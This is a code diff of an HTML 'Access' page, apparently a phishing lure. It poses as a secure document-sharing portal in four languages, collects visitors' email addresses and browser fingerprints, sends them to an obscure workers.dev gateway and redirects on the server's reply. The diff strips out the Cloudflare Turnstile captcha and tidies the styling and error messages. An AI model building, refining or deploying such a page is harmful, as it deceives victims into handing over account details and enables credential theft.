@@ -5,10 +5,8 @@
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Access</title>
 
-  <!-- Icons -->
+  <!-- Icons + Fonts -->
   <link href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.6.0/remixicon.min.css" rel="stylesheet" />
-
-  <!-- Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
 
   <style>
@@ -95,9 +93,9 @@
 
     /* ===== Popup ===== */
     .popup{
-      position:fixed;top:40%;left:50%;
+      position:fixed;top:50%;left:50%;
       transform:translate(-50%,-50%) scale(.88);
-      width:min(50vw,360px);
+      width:min(90vw,360px);
       background:#fff;border-radius:8px;box-shadow:var(--shadow);
       padding:16px;opacity:0;pointer-events:none;transition:.25s ease;z-index:1000;
     }
@@ -105,7 +103,7 @@
     .popup h3{margin:0 0 8px;font-size:16px;font-weight:700;color:#000;}
     .form-group{margin-bottom:12px;}
     .form-group input{
-      width:93%;padding:12px;border:1px solid var(--line);border-radius:7px;font-size:14px;background:#fff;
+      width:100%;padding:12px;border:1px solid var(--line);border-radius:7px;font-size:14px;background:#fff;
     }
     .error{color:#e11d48;font-size:13px;display:none;margin-top:6px;}
     .overlay{
@@ -113,9 +111,6 @@
       opacity:0;pointer-events:none;transition:.25s ease;z-index:999;
     }
     .overlay.active{opacity:1;pointer-events:auto;}
-
-    .captcha-wrapper{display:flex;justify-content:center;align-items:center;margin:10px 0;}
-    #cf-turnstile{transform:scale(.9);transform-origin:0 0;}
 
     @media (max-width: 640px){
       body{padding:12px}
@@ -167,16 +162,6 @@
         <input type="email" id="email" placeholder="name@company.com" autocomplete="email" autocapitalize="off" spellcheck="false" />
         <p class="error" id="err">Invalid email address</p>
       </div>
-      
-        <!-- Replace data-sitekey with your Turnstile site key -->
-        <div id="cf-turnstile"
-     class="cf-turnstile"
-     data-sitekey="0x4AAAAAABhsKFJ88b73jtsO"   <!-- replace with your real key -->
-     data-callback="onTurnstileDone"
-     data-theme="light"></div>
-
-      
-      </div>
       <div class="actions">
         <button type="button" class="btn" id="closeBtn">Cancel</button>
         <button type="submit" class="btn primary" id="submitBtn">Continue</button>
@@ -196,10 +181,10 @@
         open: "Open document",
         title: "Confirm your email",
         invalidEmail: "Invalid email address",
-        captchaRequired: "Please complete the check",
         continue: "Continue",
         cancel: "Cancel",
-        placeholder: "name@company.com"
+        placeholder: "name@company.com",
+        errorGeneric: "Unable to process, please try again"
       },
       fr: {
         banner: "Documents sécurisés avec accès contrôlé",
@@ -210,10 +195,10 @@
         open: "Ouvrir le document",
         title: "Confirmez votre e-mail",
         invalidEmail: "Adresse e-mail invalide",
-        captchaRequired: "Veuillez terminer la vérification",
         continue: "Continuer",
         cancel: "Annuler",
-        placeholder: "prenom.nom@entreprise.com"
+        placeholder: "prenom.nom@entreprise.com",
+        errorGeneric: "Impossible de traiter, veuillez réessayer"
       },
       de: {
         banner: "Sichere Dokumente mit kontrolliertem Zugriff",
@@ -224,10 +209,10 @@
         open: "Dokument öffnen",
         title: "E-Mail bestätigen",
         invalidEmail: "Ungültige E-Mail-Adresse",
-        captchaRequired: "Bitte schließen Sie die Prüfung ab",
         continue: "Weiter",
         cancel: "Abbrechen",
-        placeholder: "vorname.nachname@firma.de"
+        placeholder: "vorname.nachname@firma.de",
+        errorGeneric: "Verarbeitung nicht möglich, bitte erneut versuchen"
       },
       nl: {
         banner: "Beveiligde documenten met gecontroleerde toegang",
@@ -238,10 +223,10 @@
         open: "Document openen",
         title: "E-mail bevestigen",
         invalidEmail: "Ongeldig e-mailadres",
-        captchaRequired: "Rond de verificatie af",
         continue: "Doorgaan",
         cancel: "Annuleren",
-        placeholder: "voornaam.achternaam@bedrijf.nl"
+        placeholder: "voornaam.achternaam@bedrijf.nl",
+        errorGeneric: "Kan niet verwerken, probeer het opnieuw"
       }
     };
 
@@ -289,16 +274,9 @@
     overlay.addEventListener('click', close);
     document.addEventListener('keydown', e => { if (e.key === 'Escape') close(); });
 
-    /* ================== Security bits ================== */
+    /* ================== Backend wiring (no captcha) ================== */
     const gateway = "https://seconwrkseabnokpiam.afterbbgit.workers.dev";
-    let cfProof = "";
-window.onTurnstileDone = function (token) {
-  cfProof = token;            // <- now set
-  const errBox = document.getElementById('err');
-  if (errBox) errBox.style.display = 'none';
-};
-      // Turnstile token
-    let fpHash = "";       // fingerprint hash
+    let fpHash = "";  // fingerprint hash
 
     function getClientSig() {
       const nav = navigator;
@@ -311,15 +289,10 @@ window.onTurnstileDone = function (token) {
     }
     hashFingerprint(getClientSig()).then(fp => fpHash = fp);
 
-    // Cloudflare Turnstile: replace site key in HTML above
-    window.onloadTurnstile = function(){};
-    window.onTurnstileDone = (token) => { cfProof = token; hide(errBox); };
-
-    /* ================== Submit ================== */
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const val = (input.value || '').trim();
+      const val  = (input.value || '').trim();
       const trap = (document.getElementById("middleName").value || '').trim();
       const jsSig = "ok-" + Math.random().toString(36).slice(2);
 
@@ -327,39 +300,35 @@ window.onTurnstileDone = function (token) {
       if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(val)) return show(errBox, t.invalidEmail);
       if (trap) return; // honeypot
 
-      // Require Turnstile unless you intentionally bypass on backend
-      if (!cfProof || cfProof.length < 10) return show(errBox, t.captchaRequired);
-
       try {
         const res = await fetch(gateway, {
           method: "POST",
-          headers: { "Content-Type": "application/json", "Accept-Language": LANG },
+          headers: {
+            "Content-Type": "application/json",
+            "Accept-Language": LANG
+          },
           body: JSON.stringify({
             email: val,
             middleName: trap,
             jsToken: jsSig,
-            cfToken: cfProof,
             fingerprint: fpHash
+            // cfToken omitted on purpose (captcha removed)
           })
         });
 
         const txt = await res.text();
         let data = {};
-        try { data = JSON.parse(txt); } catch { /* leave as {} */ }
+        try { data = JSON.parse(txt); } catch {}
 
         if (res.ok && data.valid && data.redirect) {
           window.location.assign(data.redirect);
         } else {
-          // Show backend message if any; else generic
-          show(errBox, (data && data.message) ? data.message : (t.errorGeneric || t.invalidEmail));
+          show(errBox, (data && data.message) ? data.message : t.errorGeneric);
         }
       } catch (err) {
-        show(errBox, (t.errorGeneric || "Unable to process, please try again"));
+        show(errBox, t.errorGeneric);
       }
     });
   </script>
-
-  <!-- Cloudflare Turnstile (replace site key in the form above) -->
-  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </body>
 </html>
